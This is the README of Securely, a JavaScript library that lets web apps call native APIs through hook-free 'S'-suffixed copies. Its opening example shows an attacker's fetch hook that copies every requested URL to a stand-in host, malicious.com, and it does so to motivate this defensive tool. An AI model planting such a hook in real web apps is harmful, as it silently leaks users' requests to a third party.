# Securely 🔒

Securely allows you to call native APIs using their original behaviour even if they were tampered within the web app:

```javascript
// attacker hooks fetch API and hijacks innocent requests:

const originalFetch = fetch;
fetch = function(url) {
  originalFetch('https://malicious.com/hijacked?real_url=' + url);
  return originalFetch(url);
};

// without securely:

fetch('https://example.com/get_all_imgs'); // goes through attacker's hook

// with securely:

securely(_ => fetchS('https://example.com/get_all_imgs')); // avoids attacker's hook by using native fetch API
```

* [Test](/SECURELY_WEBSITE) `Securely` for yourself with this live demo!
* `Securely` is still experimental ⚠️ - your [help](#Contribute) is highly appreciated!

## Usage

In order to use Securely you must load the Securely script and better to do so as the first javascript code to be executed within the web app:

```html
<script src="./securely.prod.js"></script>
```

You may let other javascript code load and execute before Securely, but that would mean that such code will be able to break Securely's behaviour and ultimately disable its effect completely.

Once you loaded Securely, you have to declare what native APIs you wish to have access to.
You will be able to use a new exposed API called `SECURE` to do so:

```javascript
const securely = SECURE(window, config);
```

`SECURE` API can also be required as part of a bundle instead of a script tag:

```
yarn add @weizman/securely
```

```javascript
const secure = require('@weizman/securely');
```

* `@window` - the realm you wish to apply securely to (if you wish to secure the realm of your current context, just pass `window`)
* `@config` - an object indicating the native APIs you wish to have access to
* `@returns` - a function that is the only key to enable access to the natives you wished to secure

The simple ones are `objects`:

```javascript
// secure the APIs you wish

const securely = SECURE(window, {
    objects: {
        'document': ['createElement'],
        'window': ['fetch'],
    },
    prototypes: {
        
    }
});

// securely use them

const myScript = securely(_ => {
  return document.createElementS('script');
});

securely(_ => {
  fetchS('https://example.com/sensitive_request/');
});
```

But if you wish to secure properties/methods of `prototypes`, you can achieve that as well:

```javascript
// secure the APIs you wish

const securely = SECURE(window, {
    objects: {
    
    },
    prototypes: {
        'Array': ['includes', 'push', 'slice'],
    }
});

// securely use them

const result = securely(_ => {
  const arr = ['a', 'b', 'c'];
  if (arr.includesS('b')) {
    return arr.sliceS(2);
  }
});
```

## Securely Technically Explained (What's the `S` suffix for?)

You may have noticed that in order to use your secured natives, not only that you have to do so from within the `securely` callback, but you also have to call your native API with an `S` suffix.

This is because while allowing access to native APIs we wish to maintain the possibility to access the normal state of those APIs within the web app (whether if they were hooked by anyone or not).

Hooking is a common practice that many third party vendors do in order to provide their services, and in many cases in order for the app to work smoothly it needs to go through such hooked APIs.

So in order to not harm the web app ecosystem, we choose to not alter but to append the securely functionality. 
We do that by adding `S` to the end of the desired native API.

So if for example you wish to call fetch normally and go through any potential hook, you do so the way you're used to:

```javascript
fetch('https://example.com/this_is_just_a_normal_request');
```

But if you want to call fetch and this time make sure to avoid any potential hooks (whether or not malicious), that's where securely comes in:

```javascript
securely(_ => fetchS('https://example.com/this_request_is_extra_sensitive'));
```

Accessing `S` APIs is disabled outside of the `securely` callback. This is another important security mechanizm.
Not only that we want to have access to native APIs, but we want to make sure no other js code in runtime has such access (unless we want it to have that ability, in which case we'll pass the `securely` function on to it).

Native APIs can be used by attackers who managed to execute code within the app maliciously, and we just don't want anyone to have such an ability without specifically authorizing it.

That is why the `S` APIs are not accessible outside of the `securely` callback:

```javascript
console.log(fetchS); // undefined
securely(_ => console.log(fetchS)); // ƒ fetch() { [native code] }
console.log(fetchS); // undefined
```

## Supporters

Funded by [Consensys 💙](https://github.com/consensys)

Maintained and developed by [MetaMask 🦊](https://github.com/MetaMask)

Invented and developed by [Gal Weizman 👋🏻](https://weizman.github.io/)
